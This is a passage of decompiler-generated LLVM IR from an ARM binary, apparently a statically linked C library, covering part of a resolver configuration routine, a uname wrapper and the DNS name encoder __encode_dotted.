  %v7_1c808 = icmp eq i32 %v0_1c808, 2
  br i1 %v7_1c808, label %dec_label_pc_1c814, label %dec_label_pc_1c838.preheader

dec_label_pc_1c838.preheader:                     ; preds = %dec_label_pc_1c808
  %v1_1c80c = load i32, i32* @r5, align 4
  %v1_1c83825 = inttoptr i32 %v1_1c80c to i32*
  %v2_1c83826 = load i32, i32* %v1_1c83825, align 4
  store i32 %v2_1c83826, i32* %r3.global-to-local, align 4
  store i32 %v2_1c83826, i32* %r1.global-to-local, align 4
  %v2_1c83c28 = icmp eq i32 %v2_1c83826, 0
  %v1_1c84429 = add i32 %v1_1c80c, 4
  store i32 %v1_1c84429, i32* @r4, align 4
  br i1 %v2_1c83c28, label %dec_label_pc_1c8f0, label %dec_label_pc_1c82c

dec_label_pc_1c814:                               ; preds = %dec_label_pc_1c808
  %v0_1c814 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c814 = inttoptr i32 %v0_1c814 to i32*
  %v2_1c814 = load i32, i32* %v1_1c814, align 4
  store i32 %v2_1c814, i32* @r1, align 4
  %v3_1c81c = call i32 @__GI_strcoll(i8* %v2_1c81c, i32 %v2_1c814)
  %v2_1c820 = icmp eq i32 %v3_1c81c, 0
  br i1 %v2_1c820, label %dec_label_pc_1c850, label %dec_label_pc_1c8f0

dec_label_pc_1c82c:                               ; preds = %dec_label_pc_1c838.preheader, %dec_label_pc_1c82c.dec_label_pc_1c838_crit_edge
  %v2_1c83830 = phi i32 [ %v2_1c838, %dec_label_pc_1c82c.dec_label_pc_1c838_crit_edge ], [ %v2_1c83826, %dec_label_pc_1c838.preheader ]
  %v3_1c82c = call i32 @__GI_strcasecmp(i8* %v2_1c81c, i32 %v2_1c83830)
  %v2_1c830 = icmp eq i32 %v3_1c82c, 0
  br i1 %v2_1c830, label %dec_label_pc_1c850, label %dec_label_pc_1c82c.dec_label_pc_1c838_crit_edge

dec_label_pc_1c82c.dec_label_pc_1c838_crit_edge:  ; preds = %dec_label_pc_1c82c
  %v0_1c838.pre = load i32, i32* @r4, align 4
  %v1_1c838 = inttoptr i32 %v0_1c838.pre to i32*
  %v2_1c838 = load i32, i32* %v1_1c838, align 4
  store i32 %v2_1c838, i32* %r3.global-to-local, align 4
  store i32 %v2_1c838, i32* %r1.global-to-local, align 4
  %v2_1c83c = icmp eq i32 %v2_1c838, 0
  %v1_1c844 = add i32 %v0_1c838.pre, 4
  store i32 %v1_1c844, i32* @r4, align 4
  br i1 %v2_1c83c, label %dec_label_pc_1c8f0, label %dec_label_pc_1c82c

dec_label_pc_1c850:                               ; preds = %dec_label_pc_1c82c, %dec_label_pc_1c814
  %v0_1c850 = load i32, i32* @r5, align 4
  %v1_1c850 = inttoptr i32 %v0_1c850 to i32*
  %v2_1c850 = load i32, i32* %v1_1c850, align 4
  store i32 %v2_1c850, i32* %r3.global-to-local, align 4
  %v4_1c850 = add i32 %v0_1c850, 4
  store i32 %v4_1c850, i32* @r5, align 4
  %v2_1c854 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1c854, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1c85c = load i32, i32* @r7, align 4
  %v2_1c85c = inttoptr i32 %v1_1c85c to i32*
  store i32 %v2_1c850, i32* %v2_1c85c, align 4
  %v0_1c860 = load i32, i32* @lr, align 4
  %v1_1c860 = load i32, i32* @ip, align 4
  %v2_1c860 = add i32 %v1_1c860, 4
  %v3_1c860 = inttoptr i32 %v2_1c860 to i32*
  store i32 %v0_1c860, i32* %v3_1c860, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1c868 = load i32, i32* @r8, align 4
  %v7_1c868 = icmp eq i32 %v0_1c868, 2
  %v0_1c86c = load i32, i32* @r5, align 4
  %v1_1c86c = load i32, i32* @r7, align 4
  %v2_1c86c = add i32 %v1_1c86c, 4
  %v3_1c86c = inttoptr i32 %v2_1c86c to i32*
  store i32 %v0_1c86c, i32* %v3_1c86c, align 4
  %v0_1c870 = load i32, i32* @ip, align 4
  %v1_1c870 = load i32, i32* @r7, align 4
  %v2_1c870 = add i32 %v1_1c870, 16
  %v3_1c870 = inttoptr i32 %v2_1c870 to i32*
  store i32 %v0_1c870, i32* %v3_1c870, align 4
  %v0_1c874 = load i32, i32* @sl, align 4
  %v1_1c874 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c874 = add i32 %v1_1c874, 24
  %v3_1c874 = inttoptr i32 %v2_1c874 to i32*
  store i32 %v0_1c874, i32* %v3_1c874, align 4
  br i1 %v7_1c868, label %dec_label_pc_1c87c, label %dec_label_pc_1c8ac

dec_label_pc_1c87c:                               ; preds = %dec_label_pc_1c850
  %v3_1c87c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1c87c, i32* %r3.global-to-local, align 4
  %v0_1c880 = load i32, i32* @r8, align 4
  %v1_1c884 = inttoptr i32 %v3_1c87c to i32*
  %v2_1c884 = load i32, i32* %v1_1c884, align 4
  store i32 %v2_1c884, i32* %r1.global-to-local, align 4
  %v0_1c888 = load i32, i32* @sl, align 4
  store i32 %v0_1c888, i32* %r2.global-to-local, align 4
  %v3_1c88c = inttoptr i32 %v2_1c884 to i8*
  %v4_1c88c = call i32 @inet_pton(i32 %v0_1c880, i8* %v3_1c88c, i32 %v0_1c888)
  %tmp23 = icmp slt i32 %v4_1c88c, 1
  br i1 %tmp23, label %dec_label_pc_1c8ec, label %dec_label_pc_1c898

dec_label_pc_1c898:                               ; preds = %dec_label_pc_1c87c
  %v0_1c89c = load i32, i32* @r7, align 4
  %v2_1c89c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1c89c, i32* %v2_1c89c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1c8a4 = load i32, i32* @r8, align 4
  %v1_1c8a4 = load i32, i32* @r7, align 4
  %v2_1c8a4 = add i32 %v1_1c8a4, 8
  %v3_1c8a4 = inttoptr i32 %v2_1c8a4 to i32*
  store i32 %v0_1c8a4, i32* %v3_1c8a4, align 4
  %v0_1c8e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c8e0

dec_label_pc_1c8ac:                               ; preds = %dec_label_pc_1c850
  %v0_1c8ac = load i32, i32* @r8, align 4
  %v7_1c8ac = icmp eq i32 %v0_1c8ac, 10
  br i1 %v7_1c8ac, label %dec_label_pc_1c8b4, label %dec_label_pc_1c8ec

dec_label_pc_1c8b4:                               ; preds = %dec_label_pc_1c8ac
  %v3_1c8b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1c8b4, i32* %r3.global-to-local, align 4
  %v1_1c8bc = inttoptr i32 %v3_1c8b4 to i32*
  %v2_1c8bc = load i32, i32* %v1_1c8bc, align 4
  store i32 %v2_1c8bc, i32* %r1.global-to-local, align 4
  %v0_1c8c0 = load i32, i32* @sl, align 4
  store i32 %v0_1c8c0, i32* %r2.global-to-local, align 4
  %v3_1c8c4 = inttoptr i32 %v2_1c8bc to i8*
  %v4_1c8c4 = call i32 @inet_pton(i32 10, i8* %v3_1c8c4, i32 %v0_1c8c0)
  %tmp24 = icmp slt i32 %v4_1c8c4, 1
  br i1 %tmp24, label %dec_label_pc_1c8ec, label %dec_label_pc_1c8d0

dec_label_pc_1c8d0:                               ; preds = %dec_label_pc_1c8b4
  store i32 %tmp7, i32* @ip, align 4
  %v0_1c8d4 = load i32, i32* @r8, align 4
  %v1_1c8d4 = load i32, i32* @r7, align 4
  %v2_1c8d4 = add i32 %v1_1c8d4, 8
  %v3_1c8d4 = inttoptr i32 %v2_1c8d4 to i32*
  store i32 %v0_1c8d4, i32* %v3_1c8d4, align 4
  %v0_1c8d8 = load i32, i32* @r7, align 4
  %v1_1c8d8 = load i32, i32* @ip, align 4
  %v2_1c8d8 = inttoptr i32 %v1_1c8d8 to i32*
  store i32 %v0_1c8d8, i32* %v2_1c8d8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c8e0

dec_label_pc_1c8e0:                               ; preds = %dec_label_pc_1c898, %dec_label_pc_1c8d0
  %v0_1c8e4 = phi i32 [ %v0_1c8e4.pre, %dec_label_pc_1c898 ], [ 16, %dec_label_pc_1c8d0 ]
  store i32 0, i32* @sb, align 4
  %v1_1c8e4 = load i32, i32* @r7, align 4
  %v2_1c8e4 = add i32 %v1_1c8e4, 12
  %v3_1c8e4 = inttoptr i32 %v2_1c8e4 to i32*
  store i32 %v0_1c8e4, i32* %v3_1c8e4, align 4
  br label %dec_label_pc_1c914

dec_label_pc_1c8ec:                               ; preds = %dec_label_pc_1c8ac, %dec_label_pc_1c8b4, %dec_label_pc_1c87c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1c8f0

dec_label_pc_1c8f0:                               ; preds = %dec_label_pc_1c838.preheader, %dec_label_pc_1c82c.dec_label_pc_1c838_crit_edge, %dec_label_pc_1c814, %dec_label_pc_1c8ec, %dec_label_pc_1c7a4
  %v0_1c8f0 = load i32, i32* @r6, align 4
  store i32 %v2_1c7ac, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1c7e0, i32* %r3.global-to-local, align 4
  %v4_1c900 = inttoptr i32 %v0_1c8f0 to i32*
  %v5_1c900 = call i32 @__GI_config_read(i32* %v4_1c900, i32 %v2_1c7ac, i32 459270, i32 %v0_1c7e0)
  %v2_1c904 = icmp eq i32 %v5_1c900, 0
  br i1 %v2_1c904, label %dec_label_pc_1c90c, label %dec_label_pc_1c7f4

dec_label_pc_1c90c:                               ; preds = %dec_label_pc_1c8f0
  %v0_1c90c = load i32, i32* @fp, align 4
  %v7_1c90c = icmp eq i32 %v0_1c90c, 1
  br i1 %v7_1c90c, label %dec_label_pc_1c91c, label %dec_label_pc_1c914

dec_label_pc_1c914:                               ; preds = %dec_label_pc_1c90c, %dec_label_pc_1c8e0
  %v0_1c914 = load i32, i32* @r6, align 4
  %v1_1c918 = inttoptr i32 %v0_1c914 to i32*
  %v2_1c918 = call i32 @__GI_config_close(i32* %v1_1c918)
  br label %dec_label_pc_1c91c

dec_label_pc_1c91c:                               ; preds = %dec_label_pc_1c7f4, %.thread, %dec_label_pc_1c90c, %dec_label_pc_1c790, %dec_label_pc_1c914
  %v0_1c91c = load i32, i32* @sb, align 4
  store i32 %v3_1c734, i32* @r4, align 4
  store i32 %v6_1c734, i32* @r5, align 4
  store i32 %v9_1c734, i32* @r6, align 4
  store i32 %v12_1c734, i32* @r7, align 4
  store i32 %v15_1c734, i32* @r8, align 4
  store i32 %v18_1c734, i32* @sb, align 4
  store i32 %v21_1c734, i32* @sl, align 4
  store i32 %v24_1c734, i32* @fp, align 4
  ret i32 %v0_1c91c

; uselistorder directives
  uselistorder i32 %v2_1c838, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1c838.pre, { 1, 0 }
  uselistorder i32 %v0_1c7e0, { 1, 0 }
  uselistorder i32 %v2_1c7ac, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 10, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 7, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 38, 40, 41, 10, 45, 48, 49, 50, 28, 29, 12, 11, 4, 52, 51, 42, 13, 53, 14, 54, 15, 55, 56, 1, 30, 16, 31, 17, 18, 19, 39, 8, 0, 43, 44, 20, 59, 46, 47, 32, 33, 21, 34, 22, 9, 35, 36, 37, 7, 6, 2, 57, 58, 23, 5, 25, 26, 24, 27, 60 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 8, 9, 10, 11, 12, 13, 14, 23, 24, 25, 26, 27, 15 }
  uselistorder i32 24, { 38, 42, 44, 45, 0, 56, 28, 46, 47, 14, 15, 16, 17, 43, 57, 1, 50, 51, 52, 39, 40, 29, 12, 41, 18, 19, 20, 6, 13, 48, 49, 2, 53, 30, 31, 32, 33, 34, 35, 36, 37, 21, 54, 55, 22, 23, 24, 25, 26, 27, 9, 10, 5, 4, 11, 3, 7, 8, 58, 59 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 4, 27, 13, 5, 24, 25, 14, 15, 16, 17, 1, 19, 6, 20, 21, 2, 7, 22, 8, 29, 9, 30, 31, 32, 26, 23, 18, 0, 10, 28, 11, 12, 3 }
  uselistorder i32 34, { 8, 9, 10, 11, 2, 3, 0, 5, 13, 4, 14, 7, 1, 12, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_28010.981 to i32), { 98, 70, 71, 72, 99, 3, 4, 73, 100, 1, 101, 102, 103, 104, 105, 106, 74, 75, 107, 108, 26, 109, 9, 11, 6, 7, 10, 5, 8, 110, 12, 76, 111, 112, 113, 13, 77, 114, 115, 29, 27, 28, 14, 15, 116, 16, 117, 17, 118, 18, 119, 78, 120, 79, 121, 19, 20, 122, 80, 123, 124, 125, 126, 127, 128, 39, 38, 40, 129, 30, 64, 60, 58, 57, 59, 61, 62, 63, 56, 65, 51, 53, 52, 50, 49, 54, 55, 46, 45, 48, 47, 44, 43, 42, 41, 82, 66, 81, 67, 68, 83, 130, 2, 85, 84, 86, 21, 131, 22, 87, 88, 132, 90, 133, 134, 135, 136, 23, 137, 92, 91, 37, 34, 35, 36, 33, 24, 69, 32, 138, 89, 93, 139, 94, 140, 25, 141, 142, 31, 143, 95, 144, 0, 96, 97 }
  uselistorder i32* @fp, { 37, 38, 39, 40, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 63, 73, 74, 75, 76, 77, 78, 79, 80, 81, 4, 5, 82, 83, 1, 84, 85, 86, 87, 41, 42, 43, 44, 45, 46, 47, 48, 2, 59, 60, 61, 62, 134, 136, 135, 137, 118, 119, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 64, 65, 66, 67, 68, 69, 70, 71, 72, 6, 7, 8, 9, 10, 11, 12, 13, 14, 28, 29, 30, 31, 32, 33, 34, 35, 36, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 138, 139, 140, 141, 142, 143, 144, 151, 152, 150, 145, 146, 147, 148, 149, 3 }
  uselistorder i32* @sl, { 30, 31, 32, 33, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56, 57, 58, 59, 0, 60, 1, 61, 62, 63, 64, 65, 66, 67, 68, 69, 8, 9, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 34, 35, 36, 37, 38, 5, 6, 10, 11, 49, 50, 51, 52, 53, 54, 84, 85, 86, 2, 87, 88, 89, 90, 91, 92, 94, 3, 93, 96, 95, 97, 98, 99, 100, 80, 81, 82, 83, 14, 15, 16, 17, 18, 19, 20, 4, 21, 22, 23, 24, 25, 12, 13, 26, 27, 28, 29, 7 }
  uselistorder i32* @sb, { 16, 17, 18, 19, 24, 25, 26, 27, 28, 29, 42, 30, 31, 32, 2, 33, 70, 71, 3, 72, 73, 74, 75, 76, 77, 78, 5, 6, 7, 79, 80, 81, 82, 83, 84, 85, 20, 21, 22, 23, 34, 35, 36, 37, 38, 39, 40, 41, 88, 91, 89, 90, 92, 86, 87, 8, 9, 10, 11, 12, 13, 14, 0, 15, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 1, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 4 }
  uselistorder i32* @r8, { 41, 42, 43, 44, 45, 46, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 70, 73, 74, 75, 76, 77, 78, 3, 79, 80, 81, 82, 83, 84, 14, 15, 16, 85, 86, 87, 88, 89, 90, 91, 92, 93, 47, 48, 49, 50, 17, 18, 19, 8, 9, 4, 10, 65, 66, 5, 67, 68, 69, 96, 97, 98, 99, 100, 6, 101, 102, 103, 104, 105, 106, 107, 108, 7, 94, 95, 71, 72, 20, 21, 0, 22, 31, 32, 33, 34, 35, 36, 2, 37, 1, 38, 39, 40, 11, 12, 29, 30, 62, 63, 23, 24, 25, 26, 27, 28, 13 }
  uselistorder label %dec_label_pc_1c91c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1c8f0, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1c8ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1c82c, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c938 = load i32, i32* @r7, align 4
  store i32 %v3_1c938, i32* %stack_var_-8, align 4
  %v0_1c944 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1c944, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c944, -4095
  br i1 %tmp, label %dec_label_pc_1c964, label %dec_label_pc_1c954

dec_label_pc_1c954:                               ; preds = %entry
  %v0_1c954 = call i32 @__GI___errno_location()
  %v0_1c958 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c958 = sub i32 0, %v0_1c958
  %v2_1c95c = inttoptr i32 %v0_1c954 to i32*
  store i32 %v1_1c958, i32* %v2_1c95c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1c964.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1c964

dec_label_pc_1c964:                               ; preds = %entry, %dec_label_pc_1c954
  %v1_1c968 = phi i32 [ %v0_1c944, %entry ], [ -1, %dec_label_pc_1c954 ]
  %v2_1c964 = phi i32 [ %v3_1c938, %entry ], [ %v2_1c964.pre, %dec_label_pc_1c954 ]
  store i32 %v2_1c964, i32* @r7, align 4
  ret i32 %v1_1c968

; uselistorder directives
  uselistorder i32 %v0_1c944, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 48, 47, 60, 45, 44, 43, 42, 84, 83, 82, 33, 37, 59, 58, 81, 80, 77, 46, 32, 57, 56, 79, 78, 76, 75, 74, 73, 5, 39, 51, 17, 9, 72, 8, 22, 7, 16, 15, 14, 41, 40, 71, 70, 69, 38, 13, 12, 52, 21, 31, 30, 50, 11, 25, 28, 61, 27, 55, 54, 53, 68, 35, 34, 6, 2, 4, 36, 66, 10, 67, 0, 49, 3, 23, 65, 24, 29, 64, 63, 62, 19, 1, 18, 85, 26, 20 }
  uselistorder i32* @r7, { 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 154, 155, 156, 157, 158, 159, 160, 161, 168, 169, 170, 171, 172, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 22, 23, 24, 25, 1, 26, 3, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 78, 5, 79, 80, 81, 27, 28, 29, 30, 31, 32, 33, 34, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 82, 2, 83, 84, 85, 86, 6, 173, 174, 123, 7, 124, 125, 126, 127, 128, 129, 35, 36, 41, 42, 43, 44, 37, 38, 39, 40, 45, 46, 47, 48, 275, 276, 107, 108, 245, 246, 235, 236, 49, 237, 233, 234, 277, 278, 279, 284, 285, 8, 17, 18, 50, 51, 4, 52, 16, 53, 54, 247, 248, 253, 254, 255, 256, 257, 258, 259, 249, 250, 251, 252, 162, 163, 164, 165, 166, 167, 260, 261, 262, 263, 264, 265, 266, 267, 9, 268, 269, 270, 220, 221, 271, 272, 229, 230, 69, 70, 224, 225, 226, 10, 227, 228, 87, 88, 89, 90, 91, 92, 93, 11, 180, 181, 175, 12, 176, 177, 178, 15, 179, 55, 13, 56, 57, 182, 14, 183, 184, 94, 95, 96, 101, 102, 19, 20, 97, 98, 99, 100, 77, 0, 103, 104, 105, 106, 151, 152, 153, 238, 239, 282, 283, 58, 59, 273, 274, 109, 110, 280, 281, 231, 232, 60, 61, 222, 223, 62, 63, 64, 65, 66, 67, 68, 240, 241, 242, 243, 244, 71, 72, 73, 74, 75, 76, 21 }
  uselistorder label %dec_label_pc_1c964, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1c96c = load i32, i32* @r4, align 4
  store i32 %v3_1c96c, i32* %stack_var_-32, align 4
  %v6_1c96c = load i32, i32* @r5, align 4
  %v9_1c96c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1c974 = load i32, i32* @r1, align 4
  store i32 %v0_1c974, i32* %r8.global-to-local, align 4
  %v0_1c978 = load i32, i32* @r2, align 4
  store i32 %v0_1c978, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c9e023 = icmp slt i8* %arg1, null
  store i1 %v1_1c9e023, i1* %cpsr_n.global-to-local, align 1
  %v2_1c9e024 = icmp eq i8* %arg1, null
  store i1 %v2_1c9e024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c9e024, label %dec_label_pc_1c9f8, label %dec_label_pc_1c9ec

dec_label_pc_1c984:                               ; preds = %dec_label_pc_1c9ec
  %v2_1c984 = call i32 @__GI_strchr(i32 %v0_1c98426, i32 46)
  store i32 %v2_1c984, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c988 = icmp slt i32 %v2_1c984, 0
  store i1 %v1_1c988, i1* %cpsr_n.global-to-local, align 1
  %v2_1c988 = icmp eq i32 %v2_1c984, 0
  store i1 %v2_1c988, i1* %cpsr_z.global-to-local, align 1
  %v0_1c98c = load i32, i32* @r4, align 4
  %v2_1c98c = sub i32 %v2_1c984, %v0_1c98c
  store i32 %v2_1c98c, i32* @r5, align 4
  br i1 %v2_1c988, label %dec_label_pc_1c994, label %dec_label_pc_1c9a0

dec_label_pc_1c994:                               ; preds = %dec_label_pc_1c984
  %v1_1c994 = inttoptr i32 %v0_1c98c to i8*
  %v3_1c998 = call i32 @strlen(i8* %v1_1c994)
  %sext = mul i32 %v3_1c998, 16777216
  %v1_1c99c = sdiv i32 %sext, 16777216
  store i32 %v1_1c99c, i32* @r5, align 4
  %v0_1c9ac.pre = load i32, i32* @r4, align 4
  %v0_1c9bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1c9a0

dec_label_pc_1c9a0:                               ; preds = %dec_label_pc_1c984, %dec_label_pc_1c994
  %v0_1c9bc = phi i32 [ %v2_1c984, %dec_label_pc_1c984 ], [ %v0_1c9bc.pre, %dec_label_pc_1c994 ]
  %v0_1c9ac = phi i32 [ %v0_1c98c, %dec_label_pc_1c984 ], [ %v0_1c9ac.pre, %dec_label_pc_1c994 ]
  %v0_1c9cc = phi i32 [ %v2_1c98c, %dec_label_pc_1c984 ], [ %v1_1c99c, %dec_label_pc_1c994 ]
  %v0_1c9a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1c9a0 = add i32 %v0_1c9a0, 1
  store i32 %v1_1c9a0, i32* %r7.global-to-local, align 4
  %v1_1c9a4 = load i32, i32* %sb.global-to-local, align 4
  %v2_1c9a4 = sub i32 %v1_1c9a4, %v0_1c9a0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c9a8 = icmp slt i32 %v0_1c9cc, 0
  store i1 %v1_1c9a8, i1* %cpsr_n.global-to-local, align 1
  %v2_1c9a8 = icmp eq i32 %v0_1c9cc, 0
  store i1 %v2_1c9a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1c9ac, i32* @r1, align 4
  %v0_1c9b0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c9b0 = add i32 %v0_1c9b0, %v1_1c9a0
  store i32 %v2_1c9b0, i32* @r0, align 4
  store i32 %v0_1c9cc, i32* @r2, align 4
  %v1_1c9b8 = add i32 %v2_1c9a4, -1
  store i32 %v1_1c9b8, i32* @r3, align 4
  %v1_1c9bc = add i32 %v0_1c9bc, 1
  store i32 %v1_1c9bc, i32* @r4, align 4
  br i1 %v2_1c9a8, label %dec_label_pc_1ca0c, label %dec_label_pc_1c9c4

dec_label_pc_1c9c4:                               ; preds = %dec_label_pc_1c9a0
  %v2_1c9c4 = sub i32 %v0_1c9cc, %v1_1c9b8
  %v3_1c9c4 = icmp ult i32 %v0_1c9cc, %v1_1c9b8
  %v4_1c9c4 = xor i32 %v1_1c9b8, %v0_1c9cc
  %v5_1c9c4 = xor i32 %v2_1c9c4, %v0_1c9cc
  %v6_1c9c4 = and i32 %v5_1c9c4, %v4_1c9c4
  %v7_1c9c4 = icmp slt i32 %v6_1c9c4, 0
  store i1 %v7_1c9c4, i1* %cpsr_v.global-to-local, align 1
  %v8_1c9c4 = icmp slt i32 %v2_1c9c4, 0
  store i1 %v8_1c9c4, i1* %cpsr_n.global-to-local, align 1
  %v9_1c9c4 = icmp eq i32 %v0_1c9cc, %v1_1c9b8
  store i1 %v9_1c9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1c9c4, label %dec_label_pc_1c9cc, label %dec_label_pc_1ca0c

dec_label_pc_1c9cc:                               ; preds = %dec_label_pc_1c9c4
  %v1_1c9cc = trunc i32 %v0_1c9cc to i8
  %v4_1c9cc = add i32 %v0_1c9b0, %v0_1c9a0
  %v5_1c9cc = inttoptr i32 %v4_1c9cc to i8*
  store i8 %v1_1c9cc, i8* %v5_1c9cc, align 1
  %v0_1c9d0 = call i32 @memcpy()
  store i32 %v0_1c9d0, i32* @r0, align 4
  %v0_1c9d4 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c9d4 = icmp slt i32 %v0_1c9d4, 0
  store i1 %v1_1c9d4, i1* %cpsr_n.global-to-local, align 1
  %v2_1c9d4 = icmp eq i32 %v0_1c9d4, 0
  store i1 %v2_1c9d4, i1* %cpsr_z.global-to-local, align 1
  %v0_1c9d8 = load i32, i32* @r5, align 4
  %v1_1c9d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1c9d8 = add i32 %v1_1c9d8, %v0_1c9d8
  store i32 %v2_1c9d8, i32* %sl.global-to-local, align 4
  br i1 %v2_1c9d4, label %dec_label_pc_1c9f8, label %dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge

dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge:  ; preds = %dec_label_pc_1c9cc
  %v0_1c9e0.pre = load i32, i32* @r4, align 4
  store i32 %v0_1c9e0.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c9e0 = icmp slt i32 %v0_1c9e0.pre, 0
  store i1 %v1_1c9e0, i1* %cpsr_n.global-to-local, align 1
  %v2_1c9e0 = icmp eq i32 %v0_1c9e0.pre, 0
  store i1 %v2_1c9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c9e0, label %dec_label_pc_1c9f8, label %dec_label_pc_1c9ec

dec_label_pc_1c9ec:                               ; preds = %entry, %dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge
  %v0_1c98426 = phi i32 [ %v0_1c9e0.pre, %dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge ], [ %tmp, %entry ]
  %v5_1ca00525 = phi i32 [ %v2_1c9d8, %dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge ], [ 0, %entry ]
  %v1_1c9ec = inttoptr i32 %v0_1c98426 to i8*
  %v2_1c9ec = load i8, i8* %v1_1c9ec, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1c9f0 = icmp eq i8 %v2_1c9ec, 0
  store i1 %v2_1c9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c9f0, label %dec_label_pc_1c9f8, label %dec_label_pc_1c984

dec_label_pc_1c9f8:                               ; preds = %dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge, %dec_label_pc_1c9cc, %dec_label_pc_1c9ec, %entry
